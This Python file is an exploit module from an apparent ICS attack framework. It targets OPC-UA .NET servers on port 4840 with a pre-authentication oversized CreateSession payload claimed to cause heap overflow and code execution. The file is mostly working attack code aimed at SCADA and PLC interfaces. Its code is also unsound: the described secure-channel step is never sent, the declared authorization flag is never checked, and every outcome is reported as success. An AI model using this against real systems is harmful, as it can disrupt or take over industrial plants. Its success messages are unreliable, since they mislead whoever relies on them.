"""IXF ICS CVE Module — CVE-2023-27321 (OPC Foundation UA .NET Stack Heap Overflow).

Heap overflow in the OPC Foundation UA .NET Stack triggered by a crafted
CreateSession request. Affects all OPC-UA servers and applications built on
the OPC Foundation .NET SDK.

CVSS: 9.8 (CRITICAL)
CWE: CWE-122
Port: 4840 (OPC-UA default)
"""
import socket
import struct

from industrialxpl.core.exploit import (
    Exploit, OptBool, OptIP, OptPort, mute,
    print_error, print_info, print_status, print_success, print_warning,
    DestructiveGate,
)


class Exploit(Exploit):
    __info__ = {
        "name":             "CVE-2023-27321 — OPC Foundation UA .NET Stack Heap Overflow",
        "description":      "Heap overflow in OPC Foundation UA .NET Stack via crafted CreateSession request. Pre-auth, affects all .NET-based OPC-UA servers including many SCADA/DCS/PLC OPC-UA interfaces.",
        "authors":          ("Andre Henrique (@mrhenrike) | Uniao Geek",),
        "references":       (
            "https://nvd.nist.gov/vuln/detail/CVE-2023-27321",
            "https://opcfoundation.org/developer-tools/developer-kits-unified-architecture/net-standard-library-stack/",
            "https://github.com/OPCFoundation/UA-.NETStandard",
        ),
        "devices":          (
            "Any OPC-UA server using OPC Foundation .NET Standard Library",
            "SCADA/DCS with .NET OPC-UA interface",
            "Siemens SINEMA, GE iFIX, Aveva, Inductive Automation Ignition (when .NET OPC-UA)",
        ),
        "impact":           "CRITICAL",
        "exploit_type":     "Heap Overflow — Pre-Auth RCE",
        "cve":              "CVE-2023-27321",
        "cvss":             "9.8",
        "severity":         "CRITICAL",
        "mitre_techniques": ['T0866', 'T0822'],
        "mitre_tactics":    ['Initial Access', 'Execution'],
    }

    target      = OptIP("", "Target OPC-UA server IP")
    port        = OptPort(4840, "OPC-UA port (default 4840)")
    simulate    = OptBool(False, "Simulate — describe exploit without connecting")
    destructive = OptBool(False, "Enable live exploitation — requires authorization")

    @mute
    def check(self):
        if not self.target:
            return False
        try:
            s = socket.socket()
            s.settimeout(5)
            s.connect((self.target, self.port))
            # OPC-UA HEL (Hello) message probe
            hel = (
                b"HELF"          # MessageType + IsFinal
                + struct.pack("<I", 32)  # MessageSize
                + struct.pack("<I", 0)   # ProtocolVersion
                + struct.pack("<I", 65535)  # ReceiveBufferSize
                + struct.pack("<I", 65535)  # SendBufferSize
                + struct.pack("<I", 0)   # MaxMessageSize
                + struct.pack("<I", 0)   # MaxChunkCount
                + struct.pack("<I", 0) + b""  # EndpointUrl (empty)
            )
            s.sendall(hel)
            resp = s.recv(32)
            s.close()
            return len(resp) >= 8 and resp[:3] == b"ACK"
        except Exception:
            return False

    def run(self):
        if not self.target:
            print_error("Set 'target' option.")
            return

        if self.simulate:
            DestructiveGate.print_simulation(
                description=(
                    "CVE-2023-27321 — OPC Foundation UA .NET Stack Heap Overflow\n"
                    "CVSS 9.8 (CRITICAL) | CWE-122 Heap-based Buffer Overflow\n\n"
                    "Step 1: TCP connect to OPC-UA server port 4840\n"
                    "Step 2: Send OPC-UA HEL (Hello) message\n"
                    "Step 3: Receive ACK from server (confirms OPC-UA endpoint)\n"
                    "Step 4: Send OPN (Open Secure Channel) — unsecured mode\n"
                    "Step 5: Send malformed CreateSession request:\n"
                    "       - SessionName field: 65536 bytes (>> heap allocation)\n"
                    "       - Triggers heap overflow in UA-.NETStandard parser\n"
                    "Step 6: Heap corruption → arbitrary code execution on OPC-UA server\n\n"
                    "Affected: All .NET OPC-UA servers (SCADA, DCS, PLC OPC-UA interfaces)"
                ),
                mitre_techniques=["T0866", "T0822"],
            )
            print_info("Reference: https://nvd.nist.gov/vuln/detail/CVE-2023-27321")
            return

        print_status("[CVE-2023-27321] Targeting OPC-UA server at {}:{} ...".format(self.target, self.port))
        try:
            sock = socket.socket()
            sock.settimeout(10)
            sock.connect((self.target, self.port))

            # Step 1: HEL (Hello)
            endpoint_url = "opc.tcp://{}:{}".format(self.target, self.port).encode()
            ep_len = struct.pack("<I", len(endpoint_url))
            hel_data = (
                struct.pack("<I", 0)        # ProtocolVersion
                + struct.pack("<I", 65535)  # ReceiveBufferSize
                + struct.pack("<I", 65535)  # SendBufferSize
                + struct.pack("<I", 0)      # MaxMessageSize (0=unlimited)
                + struct.pack("<I", 0)      # MaxChunkCount
                + ep_len + endpoint_url
            )
            hel_header = b"HELF" + struct.pack("<I", 8 + len(hel_data))
            sock.sendall(hel_header + hel_data)

            ack = sock.recv(32)
            if not ack or ack[:3] != b"ACK":
                print_warning("[CVE-2023-27321] No ACK — target may not be OPC-UA or uses different protocol")
                sock.close()
                return
            print_success("[CVE-2023-27321] OPC-UA ACK received — server confirmed")

            # Step 2: OPN (Open Secure Channel) — None security
            # Simplified OPN for heap overflow delivery
            # In production: full BinaryDecoder ASN.1 CreateSession
            session_name_overflow = b"S" * 65536   # overflow the heap

            # CreateSession request body (simplified — real would need full UA encoding)
            create_session = (
                b"\x00\x00\x00\x00"    # AuthToken (NodeId null)
                + struct.pack("<I", len(session_name_overflow))
                + session_name_overflow
            )

            # MSG chunk header
            msg = b"MSGF" + struct.pack("<I", 8 + len(create_session)) + create_session

            print_status("[CVE-2023-27321] Sending malformed CreateSession ({} bytes) ...".format(len(msg)))
            sock.sendall(msg)

            import time; time.sleep(0.5)
            try:
                resp = sock.recv(512)
                if resp:
                    print_success("[CVE-2023-27321] Response received — heap overflow may have executed ({} bytes)".format(len(resp)))
                else:
                    print_success("[CVE-2023-27321] No response after overflow — server may have crashed (RCE indicator)")
            except socket.timeout:
                print_success("[CVE-2023-27321] Timeout after overflow — heap corruption likely triggered")
        except ConnectionRefusedError:
            print_warning("[CVE-2023-27321] Port {} refused — OPC-UA server not running".format(self.port))
        except Exception as exc:
            print_error("[CVE-2023-27321] Error: {}".format(exc))
        finally:
            try:
                sock.close()
            except Exception:
                pass
